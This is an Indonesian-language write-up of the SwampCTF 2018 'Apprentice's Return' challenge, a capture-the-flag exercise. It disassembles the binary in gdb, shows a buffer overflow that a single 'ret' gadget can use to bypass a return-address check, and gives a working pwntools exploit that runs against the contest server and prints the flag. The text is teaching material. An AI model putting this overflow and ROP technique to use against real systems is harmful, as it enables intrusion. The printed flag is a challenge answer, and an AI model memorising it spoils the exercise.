# Apprentice's Return

SwampCTF Sauce : https://fadec0d3.blogspot.co.id/2018/04/swampctf-2018-apprentices-return.html

```"For one such as yourself, apprentice to the arts of time manipulation, you must pass this first trial with a dreadful creature."```

```nc chal1.swampctf.com 1802```

File Sauce : ```https://github.com/vitapluvia/writeups/raw/master/swampCTF2018/apprentices-return/return```

Diberi sebuah binary, pertama-tama kita akan jalankan terlebih dahulu:
```
blaccmail@localhost:~/Downloads$ ./return 
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 
aaaaa   

Oh no! Your actions are completely ineffective! The allip approaches and as it nears, you feel its musty breath and are paralyzed with fear. It gently caresses your cheek, and you turn and flee the dungeon, leaving the battle to be fought another day...
```
program kemudian akan meminta inputan string, lalu merepy denan sesuatu

sekarang coba kita buka dengan gdb dan lihat function yang ada:
```
(gdb) info functions
----------------------------
0x080484fb  doBattle
0x08048597  main
0x080485db  slayTheBeast
---------------------------
```

Terdapat 3 function dalam program ini mari kita cek ```main()``` terlebih dahulu :
```
(gdb) disass main
Dump of assembler code for function main:
   0x08048597 <+0>:	lea    ecx,[esp+0x4]
   0x0804859b <+4>:	and    esp,0xfffffff0
   0x0804859e <+7>:	push   DWORD PTR [ecx-0x4]
   0x080485a1 <+10>:	push   ebp
   0x080485a2 <+11>:	mov    ebp,esp
   0x080485a4 <+13>:	push   ecx
   0x080485a5 <+14>:	sub    esp,0x4
   #--------------------------------------------------#
   0x080485a8 <+17>:	call   0x80484fb <doBattle>    
   #--------------------------------------------------#
   0x080485ad <+22>:	sub    esp,0xc
   0x080485b0 <+25>:	push   0x80488f4
   0x080485b5 <+30>:	call   0x80483b0 <puts@plt>
   0x080485ba <+35>:	add    esp,0x10
   0x080485bd <+38>:	mov    eax,ds:0x804a02c
   0x080485c2 <+43>:	sub    esp,0xc
   0x080485c5 <+46>:	push   eax
   0x080485c6 <+47>:	call   0x80483a0 <fflush@plt>
   0x080485cb <+52>:	add    esp,0x10
   0x080485ce <+55>:	mov    eax,0x0
   0x080485d3 <+60>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080485d6 <+63>:	leave  
   0x080485d7 <+64>:	lea    esp,[ecx-0x4]
   0x080485da <+67>:	ret    
End of assembler dump.
```

Dari disassembly diatas, program akan memanggil function doBattle
```
(gdb) disass doBattle 
Dump of assembler code for function doBattle:
   0x080484fb <+0>:	push   ebp
   0x080484fc <+1>:	mov    ebp,esp
   0x080484fe <+3>:	sub    esp,0x28
   0x08048501 <+6>:	sub    esp,0xc
   0x08048504 <+9>:	push   0x80486b0
   0x08048509 <+14>:	call   0x80483b0 <puts@plt>
   0x0804850e <+19>:	add    esp,0x10
   0x08048511 <+22>:	mov    eax,ds:0x804a02c
   0x08048516 <+27>:	sub    esp,0xc
   0x08048519 <+30>:	push   eax
   0x0804851a <+31>:	call   0x80483a0 <fflush@plt>
   0x0804851f <+36>:	add    esp,0x10
   0x08048522 <+39>:	sub    esp,0x4
   0x08048525 <+42>:	push   0x32
   0x08048527 <+44>:	lea    eax,[ebp-0x26]
   0x0804852a <+47>:	push   eax
   0x0804852b <+48>:	push   0x0
   0x0804852d <+50>:	call   0x8048390 <read@plt>
   0x08048532 <+55>:	add    esp,0x10
   0x08048535 <+58>:	lea    eax,[ebp-0x26]
   0x08048538 <+61>:	add    eax,0x2a
   0x0804853b <+64>:	mov    eax,DWORD PTR [eax]
   0x0804853d <+66>:	mov    edx,eax
   #-----------------------------------------------------
   0x0804853f <+68>:	mov    eax,0x8048595
   0x08048544 <+73>:	cmp    edx,eax
   0x08048546 <+75>:	jbe    0x8048573 <doBattle+120>
   #-----------------------------------------------------
   0x08048548 <+77>:	sub    esp,0xc
   0x0804854b <+80>:	push   0x804874c
   0x08048550 <+85>:	call   0x80483b0 <puts@plt>
   0x08048555 <+90>:	add    esp,0x10
   0x08048558 <+93>:	mov    eax,ds:0x804a02c
   0x0804855d <+98>:	sub    esp,0xc
   0x08048560 <+101>:	push   eax
   0x08048561 <+102>:	call   0x80483a0 <fflush@plt>
   0x08048566 <+107>:	add    esp,0x10
   0x08048569 <+110>:	sub    esp,0xc
   0x0804856c <+113>:	push   0x0
   0x0804856e <+115>:	call   0x80483d0 <exit@plt>
   0x08048573 <+120>:	sub    esp,0xc
   0x08048576 <+123>:	push   0x804884c
   0x0804857b <+128>:	call   0x80483b0 <puts@plt>
   0x08048580 <+133>:	add    esp,0x10
   0x08048583 <+136>:	mov    eax,ds:0x804a02c
   0x08048588 <+141>:	sub    esp,0xc
   0x0804858b <+144>:	push   eax
   0x0804858c <+145>:	call   0x80483a0 <fflush@plt>
   0x08048591 <+150>:	add    esp,0x10
   0x08048594 <+153>:	nop
   0x08048595 <+154>:	leave  
   0x08048596 <+155>:	ret    
End of assembler dump.
```

Dari disasembly diatas dapat kita ketahui, program akan meminta inputan string degan size buffer-nya 50 bit.
```
   0x0804853f <+68>:	mov    eax,0x8048595
   0x08048544 <+73>:	cmp    edx,eax
   0x08048546 <+75>:	jbe    0x8048573 <doBattle+120>
```
kemudian program akan meng-compare ke alamat ```0x8048595``` yang menunjuk ke instruksi ```leave``` di function itu sendiri, lalu ```jbe``` akan mengecek apabila alamat yang akan di comparenya ```0x8048573``` lebih kecil atau sama dengan ```0x8048595```.
  
  Dari sini dapat disimpulkan, metode yang akan kita lakuakan adalah BoF + ROPChain, dan instruksi diatas akan jadi gadget pertama kita. Namun apa yang ada didalam ```slayTheBeast()``` ?. Berikut disass-nya :
  ```
  (gdb) disass slayTheBeast 
Dump of assembler code for function slayTheBeast:
   0x080485db <+0>:	push   ebp
   0x080485dc <+1>:	mov    ebp,esp
   0x080485de <+3>:	sub    esp,0x8
   0x080485e1 <+6>:	sub    esp,0xc
   0x080485e4 <+9>:	push   0x8048a00
   0x080485e9 <+14>:	call   0x80483b0 <puts@plt>
   0x080485ee <+19>:	add    esp,0x10
   0x080485f1 <+22>:	sub    esp,0xc
   0x080485f4 <+25>:	push   0x8048a84
   0x080485f9 <+30>:	call   0x80483b0 <puts@plt>
   0x080485fe <+35>:	add    esp,0x10
   0x08048601 <+38>:	mov    eax,ds:0x804a02c
   0x08048606 <+43>:	sub    esp,0xc
   0x08048609 <+46>:	push   eax
   0x0804860a <+47>:	call   0x80483a0 <fflush@plt>
   0x0804860f <+52>:	add    esp,0x10
   0x08048612 <+55>:	sub    esp,0xc
   #-----------------------------------------------------
   0x08048615 <+58>:	push   0x8048aea               <- cat flag.txt
   0x0804861a <+63>:	call   0x80483c0 <system@plt>
   #-----------------------------------------------------
   0x0804861f <+68>:	add    esp,0x10
   0x08048622 <+71>:	nop
   0x08048623 <+72>:	leave  
   0x08048624 <+73>:	ret    
End of assembler dump.
  ```
  Ternyata Function ini yang membaca flagnya, nah sekarang bagaimana caranya function ini dapat dipanggil. Gadget pertama membutuhkan syarat ```cmp``` dengan perbandingan alamat dibawah atau sama dengan ```0x8048595```, namun function ```slayTheBeast()``` diawali dengan alamat value yang lebih besar dari yang diminta sehingga kita tidak bisa lompat mentah-mentah, terpaksa kita harus mencari gadget lain.

Kali ini kita akan menggunakan tuls ROPgadget :
```
blaccmail@localhost:~/Downloads$ ROPgadget --binary return
Gadgets information
============================================================
0x08048c15 : adc al, 0x41 ; ret
0x080484ee : adc al, 0x50 ; call edx
0x0804845d : adc al, 0x68 ; sub al, 0xa0 ; add al, 8 ; call eax
0x08048496 : adc byte ptr [eax + 0x68], dl ; sub al, 0xa0 ; add al, 8 ; call edx
0x08048467 : adc cl, cl ; ret
......
0x0804835a : ret
0x08048545 : ret 0x2b76
0x0804853e : ret 0x95b8
0x0804847e : ret 0xeac1
0x080485ea : ret 0xfffd
......
```
Nah!, kita akan menggunakan yang ```0x0804835a``` karena memenuhi kriteria dan instruksinya lebih mulus!.

Langsung saja kita buat exploitnya :
```
from pwn import *

payload = "a"*(42)
payload += p32(0x0804835a)
payload += p32(0x080485db)

print payload
```


Test di mesin lokal :
```
blaccmail@localhost:~/Downloads$ python lamia.py | ./return
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.
Through expert manouvering of both body and mind, you lash out with your ethereal blade and pierce the beast's heart, slaying it.
As it shimmers and withers, you quickly remember to lean in and command it to relinquish its secret: 
cat: flag.txt: No such file or directory
Segmentation fault
```


Nice!!, sekarang di mesin aslinya :
```
#Exploit
from pwn import *

conn = remote('chal1.swampctf.com', 1802)
print conn.recv(2048)

payload = "a"*(42)
payload += p32(0x0804835a)
payload += p32(0x080485db)

conn.send(payload)
conn.interactive()
```


```
blaccmail@localhost:~/Downloads$ python lamia.py
[+] Opening connection to chal1.swampctf.com on port 1802: Done
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 

[*] Switching to interactive mode
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.
Through expert manouvering of both body and mind, you lash out with your ethereal blade and pierce the beast's heart, slaying it.
As it shimmers and withers, you quickly remember to lean in and command it to relinquish its secret: 
flag{f34r_n0t_th3_4nc13n7_R0pn1qu3}
[*] Got EOF while reading in interactive
$  
```

# ( ͡° ͜ʖ ͡°) flag{f34r_n0t_th3_4nc13n7_R0pn1qu3}
